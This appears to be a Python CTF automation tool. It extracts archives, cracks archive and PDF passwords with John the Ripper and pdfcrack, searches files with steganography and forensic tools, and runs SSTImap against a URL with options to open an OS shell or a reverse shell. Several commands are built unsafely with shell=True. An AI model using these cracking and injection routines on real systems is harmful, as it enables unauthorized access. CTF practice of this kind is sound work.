import json
import os
import shlex
import sys
import re
import argparse
import subprocess
from typing import Optional
import zipfile
from enum import Enum
from dataclasses import dataclass
import rarfile
import py7zr
import requests
from colorama import init, Fore, Style
init()


@dataclass
class FileInfo:
    path: str
    wordlist: str
    flag_to_find: str
    file_type: 'FileType'
    flag: str
    flag_found: bool = False


@dataclass
class URLInfo:
    url: str
    port: int
    flag_to_find: str
    flag: str
    flag_found: bool = False


class FileType(Enum):
    ZIP = "zip"
    RAR = "rar"
    SEVEN_ZIP = "7-zip"
    PCAPNG = "pcapng"
    PDF = "pdf"
    JPEG = "jpeg"
    BMP = "bmp"
    RIFF = "riff"
    AU = "au"
    AD1 = "ad1"
    UNKNOWN = "unknown"
    ASCII = "ascii"


"""
Remembered Flags file
"""


FLAGS_FILE_PATH = "found_flags.json"
#dictionary to store found flags
found_flags = {}


if os.path.exists(FLAGS_FILE_PATH) :
    with open(FLAGS_FILE_PATH, "r",encoding="utf-8") as flags_file:
        found_flags = json.load(flags_file)


def save_flags_to_file() -> None:
    with open(FLAGS_FILE_PATH, "w",encoding="utf-8") as flags_file:
        json.dump(found_flags, flags_file)


def get_file_md5(file_path: str) -> str:
    try:
        result = subprocess.run(["md5sum", file_path], stdout=subprocess.PIPE, check=True)
        md5_hash = result.stdout.decode().split()[0]
        return md5_hash
    except subprocess.CalledProcessError as e:
        print("Error:", e)
        return ""


"""
File Analysis starts now 
"""


def check_file_and_extract(file_info: FileInfo) -> Optional[FileInfo]:
    try:
        #only run extraction if it's an archive type
        if file_info.file_type in [FileType.ZIP, FileType.RAR, FileType.SEVEN_ZIP]:
            print("File type: ", file_info.file_type)
            return extract_archive(file_info)
        #otherwise, return nothing.
    except subprocess.CalledProcessError:
        print("Error occurred while extracting file.")
        return None


def extract_archive(file_info: FileInfo) -> Optional[str]:
    #see if archive if encrypted
    password = check_if_encrypted(file_info.path, file_info.file_type)
    #make new extraction directory
    if file_info.path.endswith("." + file_info.file_type.value):
        extract_dir = file_info.path[:-len("." + file_info.file_type.value)] + "_extracted"
    else:
        extract_dir = os.path.basename(file_info.path) + "_extracted"
    
    print("Extract directory:", extract_dir)
    os.makedirs(extract_dir, exist_ok=True)
    #depending on filetype, run specific command to decompress file 
    command = []
    if file_info.file_type == FileType.ZIP or file_info.file_type == FileType.SEVEN_ZIP:
        command = ["7z", "x", "-y", "-o" + extract_dir, "-bso0", "-bsp0"]
    elif file_info.file_type == FileType.RAR:
        command = ["unrar", "x", "-inul", "-o+", "-op" + extract_dir]
    else:
        return None
    #append if password is present to allow for proper decompression
    if password:
        command.append("-p" + password)
    command.append(file_info.path)
    subprocess.run(command, check=False)
    #inform user of successful extraction
    print("File has been extracted.")
    return extract_dir


def check_if_encrypted(file_path: str, file_type: FileType) -> Optional[str]:
    #check if the file is a ZIP archive
    if file_type == FileType.ZIP:
        with zipfile.ZipFile(file_path) as zf:
            #run testzip, if it succeeds there is no password.
            try:
                zf.testzip()
                print("The file is not password-protected.")
                return None
            #check if testzip fails
            except RuntimeError as e: 
                #if failure message has "encrypted" then password is present
                if "encrypted" in str(e).lower():
                    print("The file is password-protected.")
                    hash_file_path = file_path + ".ziphash"
                    subprocess.run(f"zip2john {file_path} > {hash_file_path}", shell=True, check=True)
                    return crack_password(hash_file_path,wordlist)
                else:
                    return None
                
    #check if the file is a RAR archive
    elif file_type == FileType.RAR:
        with rarfile.RarFile(file_path) as rf:
            try:
                rf.testrar()
                print("The RAR file is not password-protected.")
                return None
            #if rarfile provides error message, password present. 
            except rarfile.PasswordRequired:
                print("The RAR file is password-protected.")
                hash_file_path = file_path + ".rarhash"
                subprocess.run(f"rar2john {file_path} > {hash_file_path}", shell=True, check=True)
                return crack_password(hash_file_path,wordlist)
            
    #check if the file is a 7Zip archive
    elif file_type == FileType.SEVEN_ZIP:
        with py7zr.SevenZipFile(file_path, mode='r') as szf:
            try:
                szf.testzip() 
                print("The 7zip file is not password-protected.")
                return None
            #if 7zip libraries provides exception, password present. 
            except py7zr.exceptions.PasswordRequired:
                print("The 7zip file is password-protected.")
                hash_file_path = file_path + ".7zhash"
                subprocess.run(f"7z2john {file_path} > {hash_file_path}", shell=True, check=True)
                return crack_password(hash_file_path,wordlist)
    else:
        return None


def crack_password(hash_file_path: str, wordlist: str) -> str:
    #set up the command to run
    command = f"john {hash_file_path} --wordlist={wordlist}"
    #crack the hash using JohnTheRipper
    subprocess.run(command, shell=True, check=False)
    output = subprocess.check_output(f"john --show {hash_file_path}", shell=True, text=True)
    #get just the password
    output_lines = output.split('\n')
    password = output_lines[0].split(':')[1].strip()
    #make it yellow for clarity
    print("Password cracked as:", Fore.YELLOW+password+Style.RESET_ALL)
    return password


def select_files(extract_dir: str) -> None:
    #check if directory exists
    if os.path.isdir(extract_dir):
        #get a list and number of all files in directory
        for i, filename in enumerate(os.listdir(extract_dir)):
            file_path = os.path.join(extract_dir, filename)
            #if it is a file, get the file type and print the number, name and type. 
            if os.path.isfile(file_path):
                file_type = subprocess.check_output("file " + file_path + " | grep -oP '(?<=:\s)[^,]+'", shell=True,text=True).strip()
                print(f"{i + 1}. {filename} - {file_type}")

        #take input to decide which file to analyze
        while True:
            choice = input("Enter the number of the file you want to analyze (or 'q' to quit): ")
            if choice.lower() == 'q':
                break
            try:
                choice_index = int(choice) - 1
                selected_file = os.path.join(extract_dir, os.listdir(extract_dir)[choice_index])
                print("You selected:", selected_file)
                selected_file_type = subprocess.check_output("file " + selected_file + " | grep -oP '(?<=:\s)[^,]+'", shell=True, text=True).strip()
                if selected_file:
                    if "Zip archive data" in selected_file_type or "7-zip archive data" in selected_file_type or "RAR archive data" in selected_file_type:
                        print("This is an archive")
                        #if the selected file is an archive, extract it and recurse
                        new_extract_dir = check_file_and_extract(selected_file)
                        if new_extract_dir:
                            #recursively call select_files on the newly extracted directory
                            select_files(new_extract_dir)
                    else:
                        selected_file = create_file_info(selected_file, args.wordlist, args.string)
                        analyze_file(selected_file)
                else:
                    print("No file selected.")

                break

            except (ValueError, IndexError):
                print("Invalid choice. Please enter a valid number or 'q' to quit.")
    else:
        print("This is not a directory.")


def analyze_file(selected_file: FileInfo) -> None:
    #get the MD5 for chosen file
    file_md5 = get_file_md5(selected_file.path)
    #check if flag has already been found for this file
    if file_md5 in found_flags:
        print(Fore.YELLOW + "Flag already found for this file:")
        print("Name:", selected_file.path)
        print("MD5:", file_md5)
        print("Flag:", found_flags[file_md5])
        print(Style.RESET_ALL)
        sys.exit(0)

    hexObtain = ""
    print("File is of type:" + selected_file.file_type.value)
    #1. check all ASCII strings for flag
    #2. show all exif data present
    #3. show all detected internal files
    #4. search hexdump ASCII element for flag 
    steps = [
        ("STEP 1: CHECK THE STRINGS OF THE FILE", lambda: subprocess.check_output("strings " + selected_file.path + " | egrep -i -a '" + selected_file.flag_to_find + "'", shell=True, text=True)),
        ("STEP 2: EXIF DATA", lambda: subprocess.check_output("exiftool " + selected_file.path, shell=True, text=True)),
        ("STEP 3: BINWALK DATA", lambda: subprocess.check_output("binwalk " + selected_file.path, shell=True, text=True)),
        ("STEP 4: HEX OUTPUT", lambda: subprocess.check_output(["xxd", selected_file.path], text=True)),
    ]

    for step_name, step_command in steps:
        try:
            print(Fore.GREEN + step_name + Style.RESET_ALL)
            output = step_command()
            if step_name == "STEP 4: HEX OUTPUT": 
                #assign the output to hexObtain so we can check for AD1 signature
                hexObtain = output
                #grep command - we don't want the whole hexdump, only a little bit. 
                grep_command = ["grep", "-i", "-a", "-C", "10", selected_file.flag_to_find]
                #run the grep command
                try:
                    result = subprocess.run(grep_command, input=hexObtain, text=True, capture_output=True, check=True)
                    grep_output = result.stdout
                    #swap the full output for grep output, we don't want the full output to print with highlighting. It will be unreadably huge.
                    output, grep_output = grep_output, output;
                except subprocess.CalledProcessError:
                    print(f"No instances of {selected_file.flag_to_find} found in {step_name}.")
                    break

            match = re.search(selected_file.flag_to_find, output, re.IGNORECASE)
            if match:
                matched_data = match.group()
                highlighted_output = output.replace(matched_data, Fore.RED + matched_data + Style.RESET_ALL)
                print (highlighted_output)
                selected_file.flag = matched_data
                selected_file.flag_found = True
            else:
                print (output)
        except subprocess.CalledProcessError:
            print(f"No instances of {selected_file.flag_to_find} found in {step_name}.")


    #check if hex string for .AD1 file is present in the hexdump 
    expected_signature = '4144 5345 474d 454e 5445 4446 494c 45'

    if expected_signature in hexObtain:
        print(Fore.GREEN + "The file signature matches the expected signature for an AD1 file." + Style.RESET_ALL)
        #file is known to be ad1
        selected_file.file_type = FileType.AD1
        #run binwalk
        output = subprocess.check_output(['binwalk', selected_file.path], text=True)
        #programatically extract the offsets of the compressed data sections
        offsets = [int(match.group(1)) for match in re.finditer(r'(\d+)\s+0x[0-9A-Fa-f]+\s+Zlib compressed data', output)]
        #create directories to contain the raw zlib files and extracted files from them, contained within a core directory. 
        file_name = selected_file.path
        file_name_without_path = os.path.basename(file_name)
        extract_dir = f'extracted_data_{file_name_without_path}'
        os.makedirs(extract_dir, exist_ok=True)
        zlib_dir = os.path.join(extract_dir, 'zlib_files')
        extracted_dir = os.path.join(extract_dir, 'extracted_files')
        os.makedirs(zlib_dir, exist_ok=True)
        os.makedirs(extracted_dir, exist_ok=True)

        #extract the blocks to skip and blocks to copy for each compressed data section
        for offset in offsets:
            print(f"Extracting compressed data section at offset {offset}...")
            #run the dd command to extract the compressed data section
            subprocess.run(['dd', f'if={file_name}', f'of={zlib_dir}/compressed{offset}.zlib', 'bs=1', f'skip={offset}'], check=False)
            print(f"Decompressing compressed data section at offset {offset}...")
            #run the zlib-flate command to decompress the compressed data section
            subprocess.run(f'zlib-flate -uncompress < {zlib_dir}/compressed{offset}.zlib > {extracted_dir}/decompressed{offset}', shell=True, check=False)
            print(f"Finished decompressing compressed data section at offset {offset}")
        #analyze the files extracted from the zlib files

        select_files(extracted_dir)

    else:
        print("The file signature does not match the expected signature for an AD1 file.")

    if selected_file.file_type == FileType.ASCII:
        print(Fore.GREEN + "STEP 5: ATTEMPT STEGANOGRAPHY" + Style.RESET_ALL)
        #check if stegsnow output indicates hidden data
        try:
            stegsnow_output = subprocess.check_output(["stegsnow", "-C", selected_file.path], text=True).strip()
            if stegsnow_output.strip() == "":
                print("No steganographic data found in the file.")
            else:
                print("Stegsnow file found. Output:")
                matches = re.findall(selected_file.flag_to_find, stegsnow_output)
                if not matches:
                    print("No match found for the flag.")
                    return
                #highlight matching text
                highlighted_output = stegsnow_output
                for match in matches:
                    highlighted_output = highlighted_output.replace(match, Fore.RED + match + Style.RESET_ALL)
                print(highlighted_output)
                selected_file.flag = match
                selected_file.flag_found = True
        except subprocess.CalledProcessError:
            print("Error running stegsnow command. Exiting.")

    elif selected_file.file_type == FileType.PCAPNG:
        print(Fore.GREEN + "STEP 5: CHECK PACKET FRAMES FOR STRING" + Style.RESET_ALL)
        print("PCAPNG File Detected.")
        #search packet frames for provided regex
        try:
            #manually adding quotes beforehand because we want it to be usable with regex
            command = "tshark -r " + selected_file.path + " -Y \"frame matches "+  '\\"'   + selected_file.flag_to_find +  "\\\""    +" \" -x | grep -oE '[^[:space:]]+[[:space:]]*$' "
            packetOutput = subprocess.check_output(command, shell=True, text=True)
            text_section = packetOutput.replace('\n', '')
            matches = re.findall(selected_file.flag_to_find, text_section)
            if not matches:
                print("No match found for the flag.")
                return
            highlighted_output = text_section
            for match in matches:
                highlighted_output = Fore.RED + match + Style.RESET_ALL
            print (highlighted_output)
            selected_file.flag = match
            selected_file.flag_found = True

        except subprocess.CalledProcessError:
            print("No instances of string found in packet frames. Exiting.")

    elif selected_file.file_type == FileType.PDF:
        print("PDF File Detected.")
        print(Fore.GREEN + "STEP 5: Check if PDF file has a password" + Style.RESET_ALL)
        try:
            #check if PDF is password protected
            pdfinfo_output = subprocess.check_output(["qpdf", "--show-encryption", selected_file.path], text=True)
            if "Incorrect password" in pdfinfo_output:
                print("The PDF file does have a password.")
                #crack the password and return just the password part of the output
                pdfpass = subprocess.check_output("pdfcrack " + selected_file.path + " -w " + selected_file.wordlist + " | grep -z -oP \"found user-password: '\\K[^']+'\" ", shell=True, text=True).strip("\x00")
                pdfpass = pdfpass.replace("'", "")
                #make password yellow for clarity
                print("PDF Password cracked as: " + Fore.YELLOW + pdfpass + Style.RESET_ALL)
                print("Re-running exiftool with password.")
                exifoutput = subprocess.check_output("exiftool " + selected_file.path + " -password " + pdfpass, shell=True, text=True)
                match = re.search(selected_file.flag_to_find, exifoutput, re.IGNORECASE)
                if match:
                    matched_data = match.group()
                    highlighted_output = exifoutput.replace(matched_data, Fore.RED + matched_data + Style.RESET_ALL)
                    print (highlighted_output)
                    selected_file.flag = matched_data
                    selected_file.flag_found = True
                else:
                    print (exifoutput)
            else:
                print("The PDF file is not encrypted.")
                return 
        except subprocess.CalledProcessError:
            print("Error interpreting PDF for unknown reason")

    elif selected_file.file_type in [FileType.JPEG, FileType.BMP, FileType.RIFF, FileType.AU]:
        print(Fore.GREEN + "STEP 5: ATTEMPT STEGANOGRAPHY" + Style.RESET_ALL)
        print("Running stegseek due to the detected format.")
        try:
            #run stegseek
            extracted_location = subprocess.check_output("stegseek -f -q -wl " + selected_file.wordlist + " " + selected_file.path, shell=True)
            #determine the location of the file output from stegseek, which automatically appends .out
            extracted_location = selected_file.path + ".out"
            #get just the file name absent of path so it can be used as argument
            extracted_location = extracted_location.split('/')[-1]
            #check if output file is compressed and thus gives a new directory to look into
            file_info = create_file_info(extracted_location, selected_file.wordlist, selected_file.flag_to_find)
            new_extracted_dir = check_file_and_extract(file_info)

            if new_extracted_dir:
                #flush the input stream before calling recursively so our entered input is visible when typed
                sys.stdin.flush()
                #recursively call select_files on the newly extracted directory
                select_files(new_extracted_dir)
        except subprocess.CalledProcessError:
            print("Error running stegseek command. Likely no steganographic data present. Exiting.")

    if selected_file.flag_found:
        print("\n" + Fore.YELLOW + "Flag Found! File Information:")
        print("Path:", selected_file.path)
        print("Wordlist:", selected_file.wordlist)
        print("Flag to Find:", selected_file.flag_to_find)
        print("File Type:", selected_file.file_type)
        print("Flag:", selected_file.flag)
        print("Flag Found:", selected_file.flag_found)
        print(Style.RESET_ALL) 
        #add found flags to file
        found_flags[file_md5] = selected_file.flag
        save_flags_to_file()
        sys.exit(0)
    
    else:
        print("Unknown file type. Specialized attacks unavailable.")
        return


"""
Website CTF Solve code starts now
"""


def search_website_for_flag(url_info: URLInfo) -> None:
    print(Fore.GREEN + "STEP 1: CHECK SOURCE CODE OF PAGE FOR FLAG" + Style.RESET_ALL)
    try:
        response = requests.get(url_info.url, timeout=10)
        #if request succeeds
        if response.status_code == 200:
            html_content = response.text
            lines = html_content.split('\n')
            url_info.flag_found = False
            #give each line an index and go through them
            for line_number, line in enumerate(lines, start=1):
                matches = re.finditer(url_info.flag_to_find, line, re.IGNORECASE)
                #for every match (there can be more than 1)
                for match in matches:
                    matched_string = match.group()
                    #print line with the important bit in red (the flag)
                    highlighted_line = line.replace(matched_string, Fore.RED + matched_string + Style.RESET_ALL)
                    print(f"Flag '{url_info.flag_to_find}' found on {url_info.url} at line {line_number}:")
                    print(f"{highlighted_line.strip()}")
                    url_info.flag_found = True
            if not url_info.flag_found:
                print(f"Flag '{url_info.flag_to_find}' not found on {url_info.url}")
        else:
            print(f"Failed to retrieve content from {url_info.url}. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Error occurred while fetching {url_info.url}: {e}")


def get_local_ip() -> Optional[str]:
    try:
        #get the first local ip address from list
        result = subprocess.run(['hostname', '-I'], stdout=subprocess.PIPE, check=False, text=True)
        local_ip = result.stdout.split()[0]
        return local_ip
    except Exception as e:
        print("Error:", e)
        return None


def injectFunc(url_info: URLInfo) -> None:
    print(Fore.GREEN+"STEP 2: ATTEMPT SERVER SIDE TEMPLATE INJECTION"+Style.RESET_ALL)
    #get local IP
    local_ip = get_local_ip() 
    if local_ip:
        try:
            #run SSTImap against the url
            output = subprocess.check_output(["python", "SSTIMap/sstimap.py", "-c", "5", "-f", "-u", url_info.url],text=True)
            #search for the relevant section in the output, the actual injection points. 
            match = re.search(r"SSTImap identified the following injection point:(.*?)Rerun SSTImap", output, re.DOTALL)
            if match:
                injection_point = match.group(1).strip()
            else:
                injection_point = None
            if injection_point:
                switches = []
                #check for strings within output and add them to the "switches" list if found
                if "Shell command execution" in injection_point:
                    switches.append("--os-shell")
                if "reverse shell" in injection_point:
                    reverse_switch = "--reverse-shell "+local_ip+" "+url_info.port
                    switches.append(reverse_switch)
                if "Code evaluation: ok" in injection_point:
                    switches.append("--eval-shell")

                #print numbered menu for switches
                print("Automatic switches available to use:")
                for i, switch in enumerate(switches, start=1):
                    print(f"{i}. {switch}")

                #get input for chosen switch
                choice = input("Enter the number of the switch you want to use (Q to quit): ")
                #condition to exit
                if choice.upper() == 'Q':
                    sys.exit("Exiting...")
                #execute selected switch
                try:
                    choice_index = int(choice) - 1
                    selected_switch = switches[choice_index]
                    command = ["python", "SSTIMap/sstimap.py", "-c", "5", "-f", "-u", url_info.url] + shlex.split(selected_switch)
                    subprocess.run(command, check=False)
                except (ValueError, IndexError):
                    print("Invalid choice.")
            else:
                print("No injection point found.")
        #if SSTImap fails to run print the exception
        except subprocess.CalledProcessError as e:
            print("Error:", e)
    else:
        print("Failed to retrieve local IP address.")

def create_file_info(file_path: str, wordlist: str, flag_to_find: str) -> FileInfo:
    file_type_str = subprocess.check_output("file " + file_path + " | grep -oP '(?<=:\s)[^,]+'", shell=True,text=True).strip()
    file_type_words = file_type_str.lower().split()
    for file_type in FileType:
        #make them lowercase to ensure uniformity
        #check if FileType dataclass value is present in output string
        if file_type.value.lower() in file_type_words:
            return FileInfo(path=file_path, wordlist=wordlist, flag_to_find=flag_to_find, file_type=file_type, flag=None, flag_found=False)
        
    print("No match found. Assigning file type as UNKNOWN.")
    return FileInfo(path=file_path, wordlist=wordlist, flag_to_find=flag_to_find, file_type=FileType.UNKNOWN, flag=None, flag_found=False)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Tool for detecting low hanging flags within CTF challenges. Select between URL or File analysis")

    #Mutually exclusive group. Pick EITHER -f or -u
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-f", "--file", help="The target File")
    group.add_argument("-u", "--url", help="The target URL")
    
    #arguments for file mode
    parser.add_argument("-w", "--wordlist", help="Wordlist to use. Cannot be used with target URL")
    #arguments for URL mode
    parser.add_argument("-p", "--port", help="Port for available shells. Cannot be used with target File.")
    #arguments for both modes
    parser.add_argument("-s", "--string", help="Flag format to identify. Ideally provided as a regular expression. Defaults to 'FLAG\{.*?\}'.", default='FLAG\{.*?\}')

    args = parser.parse_args()
    wordlist = args.wordlist

    #ensure port argument cannot be used with file analysis mode
    if args.file and args.port:
        parser.error("The -p/--port flag cannot be used with -f/--file.")
    #check if in file mode

    if args.file:
        #check if file exists first
        if not os.path.isfile(args.file):
            sys.exit("Error: The specified file does not exist.")
        #ensure wordlist argument is present with the file argument
        if not args.wordlist:
            parser.error("The --wordlist argument is required in -f mode.")
        #ensure that file can be read/written/executed by the owner (us)
        subprocess.run("chmod 700 " + args.file, shell=True, check=False)
        file_info = create_file_info(args.file, args.wordlist, args.string)
        #check if file needs to be extracted before analysis begins
        has_extract_dir = check_file_and_extract(file_info)
        if has_extract_dir:
            select_files(has_extract_dir)
        else:
            analyze_file(file_info)
    else:
        target_url = args.url
        port = args.port
        flag_to_find = args.string
        #ensure port is included otherwise the command won't execute
        if not port:
            parser.error("The -p/--port flag is required with -u/--url.")
        #make sure wordlist isn't included
        if args.wordlist:
            parser.error("The --wordlist argument cannot be used in -u mode.")

        search_website_for_flag(URLInfo(url=target_url, port=port, flag_to_find=flag_to_find, flag=None, flag_found=False))
        injectFunc(URLInfo(url=target_url, port=port, flag_to_find=flag_to_find, flag=None, flag_found=False))
